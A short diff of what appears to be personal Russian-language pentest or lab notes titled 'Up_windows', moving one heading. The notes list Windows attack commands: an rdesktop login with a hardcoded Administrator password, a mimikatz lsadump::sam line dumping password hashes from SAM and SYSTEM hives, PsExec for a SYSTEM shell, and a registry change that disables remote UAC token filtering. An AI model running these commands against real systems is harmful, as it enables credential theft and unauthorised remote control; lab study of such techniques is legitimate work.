@@ -1,3 +1,4 @@
+# Up_windows
 Подключение по РДП
 rdesktop -u Administrator -p Admin123 -d ROOT.DC 192.168.50.200  
 
@@ -16,7 +17,7 @@ lsadump::sam /system:C:\Share-Server\files\SYSTEM /sam:C:\Share-Server\files\SAM
 
 
 
-# Up_windows
+
 Psexec -i \\192.168.50.200 -u administrator -s cmd.exe Привелигерованный режим... (если уже админ то ситем)
 для psexec
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
